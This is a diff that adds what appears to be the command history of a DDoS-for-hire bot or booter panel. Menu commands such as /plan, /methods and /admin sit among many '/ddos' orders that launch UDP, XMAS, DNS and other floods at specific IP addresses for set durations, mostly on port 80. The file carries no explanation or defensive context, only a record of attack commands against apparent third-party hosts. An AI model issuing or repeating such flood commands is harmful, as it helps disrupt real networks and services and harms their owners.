@@ -1,0 +1,24 @@
+/plan
+/plan
+/add
+/admin
+/plan
+/ddos udp 120.22.3.129 2000 dport=80
+/ddos udp 103.95.221.2 60 dport=80
+/methods
+/ddos xmas 98.198.104.175 60 dport=80
+/ddos dns 98.198.104.175 60 dport=80
+/ddos udp 98.198.104.175 120 dport=80
+/plans
+/methods
+/ddos std 73.138.107.130 80 dport=80
+/ddos udp 183.131.168.26 60 dport=80
+/ddos std 80.127.138.236 5000 dport=80
+/ddos std 174.106.170.58 3600 dport=80
+/ddos udp 174.106.170.58 3600 dport=80
+/methods
+/methods
+/ddos udprand 95.156.221.61 200 dport=7834
+/plans
+/plan
+/methods
